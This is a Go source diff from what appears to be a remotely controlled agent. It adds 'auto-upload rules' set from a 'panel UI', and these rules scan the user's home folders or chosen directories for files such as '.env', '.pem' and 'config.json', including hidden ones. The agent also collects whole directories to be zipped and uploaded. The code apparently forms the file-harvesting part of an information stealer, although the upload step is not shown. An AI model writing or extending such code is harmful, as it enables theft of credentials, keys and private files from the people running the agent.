@@ -54,19 +54,47 @@ type scanLocation struct {
 	label   string
 }
 
+// FileScanRule is one auto-upload rule from the panel UI.
+type FileScanRule struct {
+	Extension    string `json:"extension"`    // e.g. ".env"
+	NameContains string `json:"nameContains"` // substring in file name
+	DirPath      string `json:"dirPath"`      // relative to home or absolute; empty = default folders
+	FullUpload   bool   `json:"fullUpload"`   // zip entire directory
+}
+
 // FileScanFilter limits which files are listed during a scan.
+// Prefer Rules (new). Legacy Extensions/Names/NameContains still work.
 // If all fields are empty, the default targetExtensions set is used.
 type FileScanFilter struct {
-	Extensions   []string // e.g. ".env", ".pem"
-	Names        []string // exact filename, e.g. "config.json"
-	NameContains []string // substring match on file name (case-insensitive)
+	Rules        []FileScanRule
+	Extensions   []string // legacy
+	Names        []string // legacy
+	NameContains []string // legacy
 }
 
 func (f *FileScanFilter) active() bool {
 	if f == nil {
 		return false
 	}
+	if len(f.Rules) > 0 {
+		return true
+	}
 	return len(f.Extensions) > 0 || len(f.Names) > 0 || len(f.NameContains) > 0
+}
+
+func (r FileScanRule) matches(name, ext string) bool {
+	// If rule has no file criteria, match all files in the dir (used with dir-only scan).
+	if r.Extension == "" && r.NameContains == "" {
+		return true
+	}
+	lowerName := strings.ToLower(name)
+	if r.Extension != "" && normalizeExt(r.Extension) == ext {
+		return true
+	}
+	if r.NameContains != "" && strings.Contains(lowerName, strings.ToLower(strings.TrimSpace(r.NameContains))) {
+		return true
+	}
+	return false
 }
 
 func normalizeExt(ext string) string {
@@ -111,7 +139,39 @@ func ScanFiles() []types.FileResult {
 	return ScanFilesFiltered(nil)
 }
 
-// ScanFilesFiltered is like ScanFiles but applies an optional include filter.
+// ResolveScanDir turns a rule dir path into an absolute directory.
+// Empty → ""; absolute kept; otherwise joined under home (and common roots tried).
+func ResolveScanDir(dirPath string) string {
+	dirPath = strings.TrimSpace(dirPath)
+	if dirPath == "" {
+		return ""
+	}
+	if filepath.IsAbs(dirPath) {
+		if st, err := os.Stat(dirPath); err == nil && st.IsDir() {
+			return dirPath
+		}
+		return dirPath
+	}
+	home, _ := os.UserHomeDir()
+	if home == "" {
+		return dirPath
+	}
+	// Strip leading ~/ or ~/
+	clean := strings.TrimPrefix(dirPath, "~/")
+	clean = strings.TrimPrefix(clean, `~\`)
+	candidates := []string{
+		filepath.Join(home, clean),
+		filepath.Join(home, dirPath),
+	}
+	for _, c := range candidates {
+		if st, err := os.Stat(c); err == nil && st.IsDir() {
+			return c
+		}
+	}
+	return filepath.Join(home, clean)
+}
+
+// ScanFilesFiltered is like ScanFiles but applies an optional include filter / rules.
 func ScanFilesFiltered(filter *FileScanFilter) []types.FileResult {
 	home, _ := os.UserHomeDir()
 	if home == "" {
@@ -120,10 +180,56 @@ func ScanFilesFiltered(filter *FileScanFilter) []types.FileResult {
 
 	var results []types.FileResult
 	seen := make(map[string]bool)
-
-	// Allow matching .env etc. when filter is active (default scan skips hidden names)
 	allowHidden := filter != nil && filter.active()
 
+	// New rule-based scan: each rule can target a specific directory
+	if filter != nil && len(filter.Rules) > 0 {
+		for _, rule := range filter.Rules {
+			if rule.FullUpload {
+				// Full folder upload is handled by the agent (zip), not file listing.
+				continue
+			}
+			ruleFilter := &FileScanFilter{
+				Extensions:   nil,
+				NameContains: nil,
+			}
+			if rule.Extension != "" {
+				ruleFilter.Extensions = []string{rule.Extension}
+			}
+			if rule.NameContains != "" {
+				ruleFilter.NameContains = []string{rule.NameContains}
+			}
+			// If rule only has dirPath and no file criteria, list everything under default extensions
+			// inside that dir — use active filter that matches all via empty criteria:
+			// fileMatchesFilter with inactive → targetExtensions. So pass nil filter for that case
+			// when no extension/nameContains.
+			var rf *FileScanFilter
+			if rule.Extension != "" || rule.NameContains != "" {
+				rf = ruleFilter
+			}
+
+			dir := ResolveScanDir(rule.DirPath)
+			if dir != "" {
+				label := filepath.Base(dir)
+				scanDir(dir, label, 0, &results, seen, rf, allowHidden || rf != nil)
+			} else {
+				// No dir → default user folders
+				for _, loc := range getScanLocations() {
+					d := filepath.Join(home, loc.subPath)
+					scanDir(d, loc.label, 0, &results, seen, rf, allowHidden || rf != nil)
+					if len(results) >= maxFiles {
+						break
+					}
+				}
+			}
+			if len(results) >= maxFiles {
+				break
+			}
+		}
+		return results
+	}
+
+	// Legacy flat filter or default scan
 	for _, loc := range getScanLocations() {
 		dir := filepath.Join(home, loc.subPath)
 		scanDir(dir, loc.label, 0, &results, seen, filter, allowHidden)
@@ -133,6 +239,33 @@ func ScanFilesFiltered(filter *FileScanFilter) []types.FileResult {
 	}
 
 	return results
+}
+
+// ListFullUploadDirs returns absolute dirs from rules with FullUpload=true.
+func ListFullUploadDirs(filter *FileScanFilter) []string {
+	if filter == nil {
+		return nil
+	}
+	var out []string
+	seen := map[string]bool{}
+	for _, rule := range filter.Rules {
+		if !rule.FullUpload {
+			continue
+		}
+		dir := ResolveScanDir(rule.DirPath)
+		if dir == "" {
+			continue
+		}
+		if st, err := os.Stat(dir); err != nil || !st.IsDir() {
+			continue
+		}
+		if seen[dir] {
+			continue
+		}
+		seen[dir] = true
+		out = append(out, dir)
+	}
+	return out
 }
 
 func scanDir(dir, label string, depth int, results *[]types.FileResult, seen map[string]bool, filter *FileScanFilter, allowHidden bool) {
